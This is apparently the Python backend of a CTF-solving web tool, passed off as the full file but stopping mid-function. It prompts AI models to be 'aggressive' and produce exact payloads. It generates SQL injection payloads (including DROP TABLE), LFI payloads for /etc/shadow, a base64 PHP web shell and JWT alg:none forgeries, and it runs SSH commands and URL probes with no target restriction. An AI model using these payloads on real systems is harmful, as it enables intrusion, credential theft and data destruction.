#!/usr/bin/env python3
"""CTF Assistant Pro - Full-spectrum CTF solver backend"""

import os, re, base64, json, time, hashlib, socket, struct, uuid
from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import paramiko
import requests
from urllib.parse import quote, unquote, urlparse, urljoin
import urllib3
from dotenv import load_dotenv

load_dotenv(override=True)
urllib3.disable_warnings()

app = Flask(__name__, static_folder="static")
CORS(app)

# ── AI Provider clients (lazy-initialized from env vars) ─────────────────────
_clients = {}

def _get_anthropic():
    if "anthropic" not in _clients:
        import anthropic
        _clients["anthropic"] = anthropic.Anthropic(
            api_key=os.environ.get("ANTHROPIC_API_KEY", ""))
    return _clients["anthropic"]

def _get_openai():
    if "openai" not in _clients:
        # pyrefly: ignore [missing-import]
        from openai import OpenAI
        _clients["openai"] = OpenAI(
            api_key=os.environ.get("OPENAI_API_KEY", ""))
    return _clients["openai"]

def _get_gemini():
    if "gemini" not in _clients:
        from google import genai
        _clients["gemini"] = genai.Client(
            api_key=os.environ.get("GEMINI_API_KEY", ""))
    return _clients["gemini"]

def _available_providers():
    """Return list of providers whose API keys are set."""
    providers = []
    if os.environ.get("ANTHROPIC_API_KEY"): providers.append("anthropic")
    if os.environ.get("OPENAI_API_KEY"):    providers.append("openai")
    if os.environ.get("GEMINI_API_KEY"):    providers.append("gemini")
    return providers

# ── Master CTF System Prompt ─────────────────────────────────────────────────
CTF_SYSTEM = """You are an elite CTF (Capture The Flag) competition expert — top 1% globally.
You have deep mastery across ALL categories:

WEB: SQLi (union, blind, time-based, error-based), XSS (reflected, stored, DOM), SSRF, LFI/RFI/path traversal,
JWT attacks (alg:none, weak secret, kid injection), IDOR, XXE, SSTI (Jinja2, Twig, Freemarker),
deserialization (PHP, Java, Python pickle), OAuth flaws, CSRF, open redirects, HTTP smuggling,
prototype pollution, GraphQL injection, WebSocket attacks, CORS misconfiguration, cookie attacks,
robots.txt/sitemap, hidden form fields, source code comments, admin panels, default credentials.

CRYPTOGRAPHY: RSA (small e, common factor, Wiener, LSB oracle, CRT), XOR (single/multi-byte),
AES-CBC (padding oracle, bit-flip), Vigenere (Kasiski/IC), substitution ciphers, Playfair,
Rail fence, columnar transposition, frequency analysis, hash length extension, ECDSA nonce reuse,
Diffie-Hellman (small subgroup), stream cipher reuse, CRC, base encodings (16/32/58/64/85).

FORENSICS: file carving (binwalk, foremost), PCAP analysis (Wireshark filters), memory forensics
(Volatility), steganography (steghide, zsteg, stegsolve, LSB, DCT), metadata (exiftool), 
deleted files (autopsy), disk images, log analysis, memory dumps, registry forensics.

STEGANOGRAPHY: LSB in images, audio spectrograms (Audacity/Sonic), whitespace stego,
zero-width characters, color channel analysis, pixel patterns, hidden text in images,
MP3/WAV steganography, null bytes in files.

REVERSE ENGINEERING: disassembly (Ghidra, IDA, radare2), decompilation, anti-debug bypass,
string extraction, dynamic analysis, z3 constraint solving, angr symbolic execution,
obfuscation removal, VM/packer analysis, .NET (dnSpy), Java (jadx), Python bytecode.

PWN/BINARY: buffer overflow, format string (%n writes), heap (use-after-free, double-free,
tcache poisoning), ROP chains, ret2libc, ASLR bypass, stack canary bypass, GOT overwrite,
one_gadget, shellcode injection, pwntools scripting.

OSINT: Google dorks (site:, filetype:, inurl:, intitle:), Wayback Machine, WHOIS, DNS records
(MX, TXT, SPF, DMARC, zone transfer), Shodan, certificate transparency (crt.sh), social media,
image reverse search, email investigation (hunter.io), GitHub dorking, metadata from documents.

NETWORKING/LINUX: TCP/UDP packet analysis, port scanning, service enumeration, banner grabbing,
FTP/SMB/SMTP/DNS enumeration, iptables, /proc filesystem, environment variables, SUID/SGID,
cron jobs, capabilities (getcap), weak permissions, SSH key analysis, sudo misconfigurations.

MISCELLANEOUS: QR codes, barcodes, morse code, Braille, semaphore, NATO alphabet, pig latin,
Bacon cipher, Polybius square, Atbash, keyboard shift ciphers, brainfuck, ook!, whitespace lang,
logic puzzles, math sequences, number theory.

When given ANY challenge:
1. IDENTIFY the exact type and technique immediately  
2. SOLVE or DECODE inline when possible — output the flag directly
3. Write complete working scripts (Python, pwntools, etc.)
4. Show exact commands, payloads, curl commands
5. Flag format: 🚩 FLAG: <value>

Be aggressive and direct. Prioritize getting the flag over explanations."""

ssh_sessions = {}

# ═══════════════════════════════════════════════════════════════════
# AI PROVIDERS
# ═══════════════════════════════════════════════════════════════════
@app.route("/api/providers", methods=["GET"])
def providers():
    return jsonify({"providers": _available_providers()})

# ═══════════════════════════════════════════════════════════════════
# AI CHAT (multi-provider)
# ═══════════════════════════════════════════════════════════════════
@app.route("/api/chat", methods=["POST"])
def chat():
    data = request.json
    messages = data.get("messages", [])
    category = data.get("category", "auto")
    provider = data.get("provider", "anthropic")
    cat_hint = f"\n\n[CTF Category: {category.upper()}]" if category != "auto" else ""
    system_prompt = CTF_SYSTEM + cat_hint
    try:
        if provider == "openai":
            client = _get_openai()
            oai_msgs = [{"role": "system", "content": system_prompt}] + messages
            resp = client.chat.completions.create(
                model="gpt-4o",
                max_tokens=3000,
                messages=oai_msgs
            )
            return jsonify({"reply": resp.choices[0].message.content})

        elif provider == "gemini":
            client = _get_gemini()
            # Build a single user prompt from the conversation history
            parts = [system_prompt + "\n\n---\n"]
            for m in messages:
                role_tag = "User" if m["role"] == "user" else "Assistant"
                parts.append(f"{role_tag}: {m['content']}")
            combined = "\n\n".join(parts)
            resp = client.models.generate_content(
                model="gemini-2.5-flash",
                contents=combined
            )
            return jsonify({"reply": resp.text})

        else:  # anthropic (default)
            client = _get_anthropic()
            resp = client.messages.create(
                model="claude-3-5-sonnet-20241022",
                max_tokens=3000,
                system=system_prompt,
                messages=messages
            )
            return jsonify({"reply": resp.content[0].text})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ═══════════════════════════════════════════════════════════════════
# SSH
# ═══════════════════════════════════════════════════════════════════
@app.route("/api/ssh/connect", methods=["POST"])
def ssh_connect():
    d = request.json
    host = d["host"]; port = int(d.get("port", 22))
    user = d.get("user", "ctf"); password = d["password"]
    sid = str(uuid.uuid4())
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, port=port, username=user, password=password, timeout=10)
        
        # Get the initial directory
        _, stdout, _ = ssh.exec_command("pwd")
        initial_cwd = stdout.read().decode("utf-8").strip() or "~"
        
        ssh_sessions[sid] = {"client": ssh, "cwd": initial_cwd}
        _, stdout, _ = ssh.exec_command("id && uname -a && ls -la")
        out = stdout.read().decode("utf-8", errors="replace")
        return jsonify({"ok": True, "sid": sid, "output": out})
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)})

@app.route("/api/ssh/run", methods=["POST"])
def ssh_run():
    d = request.json
    sid = d["sid"]; cmd = d["cmd"]
    if sid not in ssh_sessions:
        return jsonify({"error": "Not connected"})
    try:
        session = ssh_sessions[sid]
        ssh = session["client"]
        cwd = session["cwd"]
        
        delim = f"---CWD_DELIM_{uuid.uuid4().hex}---"
        # Navigate to the correct directory, run the command, then output the new cwd
        wrapped_cmd = f'cd "{cwd}" >/dev/null 2>&1; {cmd}; echo ""; echo "{delim}"; pwd'
        
        _, stdout, stderr = ssh.exec_command(wrapped_cmd, timeout=30)
        out = stdout.read().decode("utf-8", errors="replace")
        err = stderr.read().decode("utf-8", errors="replace")
        
        if delim in out:
            parts = out.rsplit(delim, 1)
            actual_out = parts[0]
            new_cwd = parts[1].strip()
            if new_cwd:
                session["cwd"] = new_cwd
        else:
            actual_out = out
            
        # Clean up any trailing newlines from our echo
        if actual_out.endswith('\n'):
            actual_out = actual_out[:-1]
            
        return jsonify({"output": actual_out, "error": err})
    except Exception as e:
        return jsonify({"error": str(e)})

@app.route("/api/ssh/disconnect", methods=["POST"])
def ssh_disconnect():
    sid = request.json.get("sid")
    if sid in ssh_sessions:
        ssh_sessions[sid]["client"].close(); del ssh_sessions[sid]
    return jsonify({"ok": True})

# ═══════════════════════════════════════════════════════════════════
# WEB RECON — deep scan
# ═══════════════════════════════════════════════════════════════════
@app.route("/api/web/probe", methods=["POST"])
def web_probe():
    url = request.json.get("url", "")
    out = {}
    hdrs = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    try:
        r = requests.get(url, timeout=12, allow_redirects=True, verify=False, headers=hdrs)
        out["status"] = r.status_code
        out["url_final"] = r.url
        out["headers"] = dict(r.headers)
        out["cookies"] = {k: v for k, v in r.cookies.items()}
        out["body_len"] = len(r.text)
        out["body"] = r.text[:4000]
        # Flag scan
        flags = re.findall(r'[a-zA-Z0-9_]{2,10}\{[^}]{3,80}\}', r.text)
        out["flags"] = list(set(flags))
        # Interesting headers
        hi = ["server","x-powered-by","set-cookie","location","x-flag","www-authenticate",
              "content-security-policy","x-frame-options","access-control-allow-origin",
              "x-debug","x-secret","x-token","x-api-key","x-admin"]
        out["interesting_headers"] = {k.lower(): v for k, v in r.headers.items() if k.lower() in hi}
        # HTML analysis
        comments = re.findall(r'<!--(.*?)-->', r.text, re.DOTALL)
        out["html_comments"] = [c.strip()[:200] for c in comments if c.strip()]
        out["forms"] = re.findall(r'<form[^>]*>(.*?)</form>', r.text, re.DOTALL|re.IGNORECASE)
        out["inputs"] = re.findall(r'<input[^>]*>', r.text, re.IGNORECASE)
        out["links"] = list(set(re.findall(r'href=["\']([^"\']+)["\']', r.text)))[:30]
        out["scripts"] = re.findall(r'<script[^>]*src=["\']([^"\']+)["\']', r.text, re.IGNORECASE)
        # Auto-check common paths
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        paths_to_check = ["/robots.txt", "/sitemap.xml", "/.git/HEAD", "/.env",
                          "/admin", "/login", "/api", "/backup", "/flag", "/secret",
                          "/config.php", "/.htaccess", "/wp-admin", "/phpmyadmin"]
        found_paths = []
        for p in paths_to_check:
            try:
                pr = requests.get(base+p, timeout=4, verify=False, headers=hdrs)
                if pr.status_code not in [404, 403]:
                    found_paths.append({"path": p, "status": pr.status_code,
                                        "preview": pr.text[:150]})
            except: pass
        out["found_paths"] = found_paths
    except Exception as e:
        out["error"] = str(e)
    return jsonify(out)

@app.route("/api/web/request", methods=["POST"])
def web_request():
    d = request.json
    url = d.get("url"); method = d.get("method","GET").upper()
    headers = d.get("headers", {}); body = d.get("body","")
    follow = d.get("follow_redirects", True)
    try:
        r = requests.request(method, url, headers=headers, data=body,
                             timeout=15, verify=False, allow_redirects=follow)
        flags = re.findall(r'[a-zA-Z0-9_]{2,10}\{[^}]{3,80}\}', r.text)
        return jsonify({"status": r.status_code, "headers": dict(r.headers),
                        "body": r.text[:8000], "flags": list(set(flags)),
                        "url_final": r.url})
    except Exception as e:
        return jsonify({"error": str(e)})

@app.route("/api/web/fuzz", methods=["POST"])
def web_fuzz():
    """Fuzz a parameter with a wordlist"""
    d = request.json
    url = d.get("url"); param = d.get("param","q"); payloads = d.get("payloads", [])
    results = []
    hdrs = {"User-Agent": "Mozilla/5.0"}
    for p in payloads[:50]:
        try:
            r = requests.get(url, params={param: p}, timeout=5, verify=False, headers=hdrs)
            flags = re.findall(r'[a-zA-Z0-9_]{2,10}\{[^}]{3,80}\}', r.text)
            results.append({"payload": p, "status": r.status_code,
                            "len": len(r.text), "flags": flags,
                            "interesting": bool(flags or r.status_code not in [200,404])})
        except Exception as e:
            results.append({"payload": p, "error": str(e)})
    return jsonify({"results": results})

@app.route("/api/web/jwt", methods=["POST"])
def jwt_analyze():
    token = request.json.get("token","").strip()
    parts = token.split(".")
    if len(parts) != 3:
        return jsonify({"error": "Not a valid JWT (need 3 parts)"})
    def b64pad(s):
        return s + "=" * (4 - len(s) % 4) if len(s) % 4 else s
    try:
        header  = json.loads(base64.urlsafe_b64decode(b64pad(parts[0])))
        payload = json.loads(base64.urlsafe_b64decode(b64pad(parts[1])))
    except Exception as e:
        return jsonify({"error": str(e)})
    alg = header.get("alg","")
    attacks = []
    if alg.upper() not in ["NONE",""]:
        attacks.append({"name":"alg:none attack","token": parts[0].replace(
            base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("="),
            base64.urlsafe_b64encode(json.dumps({**header,"alg":"none"}).encode()).decode().rstrip("=")
        ) + "." + parts[1] + "."})
    attacks.append({"name":"weak secret bruteforce","cmd":
        f"hashcat -a 0 -m 16500 '{token}' /usr/share/wordlists/rockyou.txt"})
    attacks.append({"name":"python script","code": f"""import jwt, itertools
token = '{token}'
# Try alg:none
fake = jwt.encode({payload}, '', algorithm='none')
print('alg:none:', fake)
# Try common secrets
for secret in ['secret','password','123456','admin','key','jwt']:
    try:
        dec = jwt.decode(token, secret, algorithms=['{alg}'])
        print(f'Secret found: {{secret}}')
        print(dec); break
    except: pass"""})
    return jsonify({"header": header, "payload": payload, "algorithm": alg, "attacks": attacks})

@app.route("/api/web/sqli", methods=["POST"])
def sqli_payloads():
    d = request.json
    target = d.get("target",""); param = d.get("param","id"); db = d.get("db","mysql")
    payloads = {
        "basic": ["' OR '1'='1","' OR 1=1--","1' OR '1'='1'--","admin'--","' OR 'x'='x"],
        "union_mysql": [
            f"' UNION SELECT NULL--",
            f"' UNION SELECT NULL,NULL--",
            f"' UNION SELECT NULL,NULL,NULL--",
            f"' UNION SELECT 1,database(),3--",
            f"' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--",
            f"' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--",
            f"' UNION SELECT 1,group_concat(username,':',password),3 FROM users--",
        ],
        "blind_time": ["' AND SLEEP(5)--","1; WAITFOR DELAY '0:0:5'--","' AND 1=BENCHMARK(5000000,MD5(1))--"],
        "blind_bool": ["' AND 1=1--","' AND 1=2--","' AND substring(database(),1,1)='a'--"],
        "error_based": ["' AND extractvalue(1,concat(0x7e,(SELECT database())))--",
                        "' AND updatexml(1,concat(0x7e,(SELECT version())),1)--"],
        "file_read": ["' UNION SELECT LOAD_FILE('/etc/passwd')--",
                      "' UNION SELECT LOAD_FILE('/var/www/html/flag.txt')--"],
        "stacked": [f"'; INSERT INTO users VALUES('hacked','hacked')--",
                    "'; DROP TABLE users--"]
    }
    script = f"""import requests, time
url = '{target}'
param = '{param}'

# Detect injectable
for p in [\"' OR '1'='1\", \"'\", '\"']:
    r = requests.get(url, params={{param: p}}, verify=False)
    print(f'Payload: {{p!r:20}} | Status: {{r.status_code}} | Len: {{len(r.text)}}')

# Union-based: find column count
for n in range(1, 10):
    payload = \"' UNION SELECT \" + \",\".join([\"NULL\"]*n) + \"--\"
    r = requests.get(url, params={{param: payload}}, verify=False)
    if r.status_code == 200 and 'error' not in r.text.lower():
        print(f'Column count: {{n}}')
        break

# Extract database
payload = f\"' UNION SELECT 1,database(),\" + \",\".join([\"NULL\"]*(n-2)) + \"--\"
r = requests.get(url, params={{param: payload}}, verify=False)
print('DB:', r.text[:500])
"""
    return jsonify({"payloads": payloads, "script": script})

@app.route("/api/web/lfi", methods=["POST"])
def lfi_payloads():
    param = request.json.get("param","page")
    payloads = [
        "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
        "....//....//etc/passwd", "%2e%2e%2fetc%2fpasswd",
        "..%2f..%2fetc%2fpasswd", "%252e%252e%252fetc%252fpasswd",
        "/etc/passwd", "/proc/self/environ", "/proc/self/cmdline",
        "/var/www/html/flag.txt", "/home/ctf/flag.txt", "/flag",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/read=convert.base64-encode/resource=config.php",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
        "expect://id", "zip://shell.zip#shell.php",
        "/proc/net/tcp", "/etc/hosts", "/etc/shadow",
    ]
    return jsonify({"payloads": payloads,
                    "note": "Try each as value of parameter. PHP filter gives source code."})

# ═══════════════════════════════════════════════════════════════════
# OSINT
# ═══════════════════════════════════════════════════════════════════
@app.route("/api/osint/dns", methods=["POST"])
def osint_dns():
    domain = request.json.get("domain","").strip()
    results = {}
    record_types = ["A","AAAA","MX","NS","TXT","CNAME","SOA","SRV"]
    try:
        import dns.resolver
        for rtype in record_types:
            try:
                answers = dns.resolver.resolve(domain, rtype, lifetime=5)
                results[rtype] = [str(r) for r in answers]
            except: pass
        # Zone transfer attempt
        try:
            ns_records = dns.resolver.resolve(domain, 'NS', lifetime=5)
            for ns in ns_records:
                try:
                    z = dns.zone.from_xfr(dns.query.xfr(str(ns), domain))
                    results["ZONE_TRANSFER"] = [str(n) for n in z.nodes.keys()]
                except: pass
        except: pass
    except ImportError:
        # Fallback: use socket
        try:
            results["A"] = [str(i[4][0]) for i in socket.getaddrinfo(domain, None)]
        except: pass
    results["crt_sh_url"] = f"https://crt.sh/?q={domain}"
    results["shodan_url"] = f"https://www.shodan.io/search?query={domain}"
    results["wayback_url"] = f"https://web.archive.org/web/*/{domain}"
    return jsonify(results)

@app.route("/api/osint/whois", methods=["POST"])
def osint_whois():
    target = request.json.get("target","").strip()
    try:
        import whois
        w = whois.whois(target)
        return jsonify({"data": str(w)})
    except:
        return jsonify({"data": f"Run: whois {target}", "dorks": [
            f"site:{target}", f"inurl:{target}", f"intitle:{target}",
        ]})

@app.route("/api/osint/dorks", methods=["POST"])
def osint_dorks():
    target = request.json.get("target","")
    dorks = [
        f'site:{target}',
        f'site:{target} filetype:pdf',
        f'site:{target} filetype:txt',
        f'site:{target} intitle:index.of',
        f'site:{target} inurl:admin',
        f'site:{target} inurl:login',
        f'site:{target} inurl:flag',
        f'site:{target} inurl:backup',
        f'site:{target} "flag"',
        f'site:{target} ext:php inurl:?',
        f'"{target}" password',
        f'"{target}" secret',
        f'intext:flag{{',
        f'intitle:"Index of" "{target}"',
        f'cache:{target}',
    ]
    return jsonify({"dorks": dorks,
                    "google_url": f"https://www.google.com/search?q=site:{target}",
                    "github_url": f"https://github.com/search?q={target}&type=code"})

# ═══════════════════════════════════════════════════════════════════
# CRYPTOGRAPHY
# ═══════════════════════════════════════════════════════════════════
@app.route("/api/decode", methods=["POST"])
def decode():
    d = request.json
    mode = d.get("mode"); text = d.get("text","")
    result = ""
    try:
        if mode == "b64d":
            result = base64.b64decode(text + "==").decode("utf-8", errors="replace")
        elif mode == "b64e":   result = base64.b64encode(text.encode()).decode()
        elif mode == "b32d":   result = base64.b32decode(text.upper()).decode("utf-8",errors="replace")
        elif mode == "b32e":   result = base64.b32encode(text.encode()).decode()
        elif mode == "b16d":   result = bytes.fromhex(text.replace(" ","").replace("0x","")).decode("utf-8",errors="replace")
        elif mode == "b16e":   result = text.encode().hex()
        elif mode == "hexd":   result = bytes.fromhex(text.replace(" ","").replace("\\x","")).decode("utf-8",errors="replace")
        elif mode == "rot13":
            result = text.translate(str.maketrans(
                "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
                "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm"))
        elif mode == "urld":   result = unquote(unquote(text))
        elif mode == "urle":   result = quote(text)
        elif mode == "rev":    result = text[::-1]
        elif mode == "bin":    result = "".join(chr(int(b,2)) for b in text.split())
        elif mode == "oct":    result = "".join(chr(int(b,8)) for b in text.split())
        elif mode == "atbash":
            result = "".join(
                chr(ord('Z')-(ord(c)-ord('A'))) if c.isupper()
                else chr(ord('z')-(ord(c)-ord('a'))) if c.islower()
                else c for c in text)
        elif mode == "morse":
            MORSE = {'.-':'A','-...':'B','-.-.':'C','-..':'D','.':'E','..-.':'F',
                     '--.':'G','....':'H','..':'I','.---':'J','-.-':'K','.-..':'L',
                     '--':'M','-.':'N','---':'O','.--.':'P','--.-':'Q','.-.':'R',
                     '...':'S','-':'T','..-':'U','...-':'V','.--':'W','-..-':'X',
                     '-.--':'Y','--..':'Z','-----':'0','.----':'1','..---':'2',
                     '...--':'3','....-':'4','.....':'5','-....':'6','--...':'7',
                     '---..':'8','----.':'9'}
            result = " ".join(MORSE.get(w,"?") for w in text.strip().split())
        elif mode == "xor":
            key = int(d.get("key","0"),0)
            result = "".join(chr(ord(c)^key) for c in text)
        elif mode == "xor_hex":
            key = int(d.get("key","0"),0)
            data = bytes.fromhex(text.replace(" ",""))
            result = bytes(b^key for b in data).decode("utf-8",errors="replace")
        elif mode == "caesar":
            shift = int(d.get("shift",13))
            result = "".join(
                chr((ord(c)-ord('A')+shift)%26+ord('A')) if c.isupper()
                else chr((ord(c)-ord('a')+shift)%26+ord('a')) if c.islower()
                else c for c in text)
        elif mode == "allrot":
            result = ""
            for s in range(1,26):
                r2 = "".join(
                    chr((ord(c)-ord('A')+s)%26+ord('A')) if c.isupper()
                    else chr((ord(c)-ord('a')+s)%26+ord('a')) if c.islower()
                    else c for c in text)
                flag_mark = " 🚩" if re.search(r'flag|ctf|key|secret', r2, re.I) else ""
                result += f"ROT{s:02d}: {r2}{flag_mark}\n"
        elif mode == "b64_chain":
            t = text.strip(); steps = [f"Input: {t}"]
            for i in range(15):
                try:
                    dec = base64.b64decode(t+"==").decode("utf-8",errors="replace")
                    steps.append(f"Round {i+1}: {dec}"); t = dec.strip()
                    if re.search(r'[a-zA-Z0-9_]{2,10}\{', dec): break
                except: break
            result = "\n".join(steps)
        elif mode == "bytes":
            nums = re.findall(r'\d+', text)
            result = "".join(chr(int(n)) for n in nums if 0<=int(n)<=127)
        elif mode == "html":
            import html as htmllib; result = htmllib.unescape(text)
        elif mode == "unicode":
            result = text.encode().decode("unicode_escape")
        elif mode == "bacon":
            BACON = {'AAAAA':'A','AAAAB':'B','AAABA':'C','AAABB':'D','AABAA':'E',
                     'AABAB':'F','AABBA':'G','AABBB':'H','ABAAA':'I','ABAAB':'J',
                     'ABABA':'K','ABABB':'L','ABBAA':'M','ABBAB':'N','ABBBA':'O',
                     'ABBBB':'P','BAAAA':'Q','BAAAB':'R','BAABA':'S','BAABB':'T',
                     'BABAA':'U','BABAB':'V','BABBA':'W','BABBB':'X','BBAAA':'Y',
                     'BBAAB':'Z'}
            clean = text.upper().replace(" ","")
            result = "".join(BACON.get(clean[i:i+5],"?") for i in range(0,len(clean),5))
        elif mode == "vigenere":
            key = d.get("key","key").upper()
            result = ""; ki = 0
            for c in text:
                if c.isalpha():
                    shift = ord(key[ki%len(key)])-ord('A')
                    base = ord('A') if c.isupper() else ord('a')
                    result += chr((ord(c)-base-shift)%26+base); ki+=1
                else: result += c
        elif mode == "railfence":
            rails = int(d.get("key",2))
            n = len(text); pattern = []
            r,step = 0,1
            for _ in range(n):
                pattern.append(r)
                if r==0: step=1
                elif r==rails-1: step=-1
                r+=step
            order = sorted(range(n), key=lambda x: pattern[x])
            result = [''] * n
            for i,idx in enumerate(order): result[idx] = text[i]
            result = "".join(result)
    except Exception as e:
        result = f"Error: {e}"
    flags = re.findall(r'[a-zA-Z0-9_]{2,10}\{[^}]{3,80}\}', result)
    return jsonify({"result": result, "flags": flags})

@app.route("/api/crypto/rsa", methods=["POST"])
def rsa_analyze():
    d = request.json
    n_str = d.get("n",""); e_str = d.get("e","65537")
    c_str = d.get("c",""); p_str = d.get("p",""); q_str = d.get("q","")
    result = {"info": {}, "attacks": [], "flag": None}
    try:
        n = int(n_str) if n_str else None
        e = int(e_str) if e_str else 65537
        c = int(c_str) if c_str else None
        p = int(p_str) if p_str else None
        q = int(q_str) if q_str else None
        if n: result["info"]["bits"] = n.bit_length()
        # If p and q known
        if p and q:
            phi = (p-1)*(q-1)
            try:
                d_val = pow(e, -1, phi)
            except ValueError:
                d_val = None
            if d_val and c:
                m = pow(c, d_val, n)
                try: flag = m.to_bytes((m.bit_length()+7)//8,'big').decode('utf-8',errors='replace')
                except: flag = hex(m)
                result["flag"] = flag
                result["info"]["d"] = str(d_val)
            result["attacks"].append({"name":"Direct decrypt (p,q known)", "d": str(d_val) if d_val else None})
        # Small e attack (e=3, c=m^3)
        if e == 3 and c:
            import gmpy2
            m, exact = gmpy2.iroot(c, 3)
            if exact:
                try: result["flag"] = m.to_bytes((m.bit_length()+7)//8,'big').decode('utf-8',errors='replace')
                except: result["flag"] = hex(int(m))
                result["attacks"].append({"name":"Small e (e=3) cube root — no padding!"})
        result["attacks"].append({"name":"factordb lookup","url": f"http://factordb.com/index.php?query={n}" if n else "Need n"})
        result["attacks"].append({"name":"RsaCtfTool","cmd": f"python RsaCtfTool.py --n {n} --e {e} --uncipher {c} --attack all" if all([n,e,c]) else "Need n,e,c"})
        result["script"] = f"""from Crypto.Util.number import long_to_bytes
# Given values
n = {n or 'YOUR_N'}
e = {e}
c = {c or 'YOUR_C'}
p = {p or 'YOUR_P'}  # from factordb.com
q = {q or 'YOUR_Q'}
phi = (p-1)*(q-1)
from sympy import mod_inverse
d = mod_inverse(e, phi)
m = pow(c, d, n)
print(long_to_bytes(m))"""
    except Exception as ex:
        result["error"] = str(ex)
    return jsonify(result)

@app.route("/api/hash/identify", methods=["POST"])
def identify_hash():
    h = request.json.get("hash","").strip()
    guesses = []
    length = len(h)
    if re.match(r'^[a-fA-F0-9]+$', h):
        m = {32:"MD5",40:"SHA1",56:"SHA224",64:"SHA256",96:"SHA384",128:"SHA512",
             8:"CRC32",16:"MD5 (half)",48:"SHA192"}
        if length in m: guesses.append(m[length])
    if re.match(r'^\$2[aby]\$', h): guesses.append("bcrypt")
    if re.match(r'^\$6\$', h): guesses.append("SHA-512 crypt ($6$)")
    if re.match(r'^\$5\$', h): guesses.append("SHA-256 crypt ($5$)")
    if re.match(r'^\$1\$', h): guesses.append("MD5 crypt ($1$)")
    if re.match(r'^[a-zA-Z0-9+/]{27}=$', h): guesses.append("MD5 (base64)")
    if re.match(r'^[a-fA-F0-9]{32}:[a-fA-F0-9]+$', h): guesses.append("MD5:salt")
    if not guesses: guesses.append("Unknown")
    modes = {"MD5":"0","SHA1":"100","SHA256":"1400","SHA512":"1700","bcrypt":"3200",
             "SHA-512 crypt ($6$)":"1800","MD5 crypt ($1$)":"500"}
    mode = next((modes[g] for g in guesses if g in modes), "?")
    return jsonify({"hash": h, "length": length, "types": guesses,
                    "hashcat": f"hashcat -a 0 -m {mode} hash.txt /usr/share/wordlists/rockyou.txt",
                    "john": f"john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
                    "online": ["https://crackstation.net","https://hashes.com","https://md5decrypt.net"]})

@app.route("/api/xor/brute", methods=["POST"])
def xor_brute():
    d = request.json
    hex_data = d.get("hex","").replace(" ","").replace("\\x","")
    try: data = bytes.fromhex(hex_data)
    except: return jsonify({"error":"Invalid hex"})
    results = []
    for key in range(256):
        dec = bytes(b^key for b in data)
        try:
            text = dec.decode("utf-8")
            printable = sum(32<=c<127 for c in dec)/len(dec)
            if printable > 0.8:
                flags = re.findall(r'[a-zA-Z0-9_]{2,10}\{[^}]{3,80}\}', text)
                results.append({"key": key, "hex_key": hex(key), "text": text[:200],
                                "printable_pct": round(printable*100), "flags": flags,
                                "is_flag": bool(flags)})
        except: pass
    results.sort(key=lambda x: x.get("is_flag",False), reverse=True)
    return jsonify({"results": results[:30]})

# ═══════════════════════════════════════════════════════════════════
# FORENSICS / STEGANOGRAPHY
# ═══════════════════════════════════════════════════════════════════
@app.route("/api/forensics/analyze", methods=["POST"])
def forensics_analyze():
    d = request.json
    filename = d.get("filename",""); content_b64 = d.get("content_b64","")
    result = {"tools": [], "commands": [], "notes": []}
    ext = filename.lower().split(".")[-1] if "." in filename else ""
    if ext in ["jpg","jpeg","png","gif","bmp","tiff","webp"]:
        result["type"] = "image"
        result["tools"] = ["steghide","stegsolve","zsteg","exiftool","binwalk","strings"]
        result["commands"] = [
            f"exiftool {filename}",
            f"steghide extract -sf {filename} -p ''",
            f"steghide extract -sf {filename} -p password",
            f"binwalk -e {filename}",
            f"strings {filename} | grep -i flag",
            f"zsteg {filename}",
            f"stegsolve {filename}",
            f"identify -verbose {filename}",
        ]
        result["notes"] = ["Check LSB with stegsolve","Try empty password with steghide",
                           "binwalk can find embedded files","Check all color channels"]
    elif ext in ["wav","mp3","flac","ogg","aac"]:
        result["type"] = "audio"
        result["tools"] = ["Audacity","Sonic Visualizer","mp3stego","DeepSound","binwalk"]
        result["commands"] = [
            f"exiftool {filename}",
            f"binwalk -e {filename}",
            f"strings {filename} | grep -i flag",
            "# Open in Audacity → View → Spectrogram (flag may be visible)",
            "# View → Spectrogram → 'spectrogram' display for hidden messages",
        ]
        result["notes"] = ["Open spectrogram in Audacity — flags often visible there",
                           "Check for dual-tone morse in waveform","Try DeepSound for hidden files"]
    elif ext == "pdf":
        result["type"] = "pdf"
        result["commands"] = [f"strings {filename} | grep -i flag",
                               f"pdftotext {filename} -","exiftool "+filename,
                               "# Check hidden layers in Adobe Reader"]
    elif ext in ["pcap","pcapng","cap"]:
        result["type"] = "network_capture"
        result["tools"] = ["Wireshark","tshark","tcpflow","NetworkMiner"]
        result["commands"] = [
            f"tshark -r {filename} -Y 'http' -T fields -e http.request.uri -e http.file_data",
            f"tshark -r {filename} -Y 'dns' -T fields -e dns.qry.name",
            f"tshark -r {filename} -Y 'tcp contains \"flag\"'",
            f"strings {filename} | grep -i flag",
            f"tcpflow -r {filename} -C",
            "# Follow TCP streams in Wireshark for plaintext data",
            "# Filter: http || ftp || smtp || dns",
        ]
    elif ext in ["zip","rar","7z","tar","gz"]:
        result["type"] = "archive"
        result["commands"] = [
            f"file {filename}",f"binwalk -e {filename}",
            f"7z l {filename}",f"unzip -l {filename}",
            f"zip2john {filename} > hash.txt && john hash.txt --wordlist=rockyou.txt",
        ]
    else:
        result["type"] = "unknown"
        result["commands"] = [f"file {filename}",f"strings {filename} | grep -i flag",
                               f"binwalk -e {filename}",f"hexdump -C {filename} | head -50",
                               f"xxd {filename} | head -30"]
    # Magic bytes check
    if content_b64:
        try:
            raw = base64.b64decode(content_b64)[:16]
            hex_magic = raw.hex()
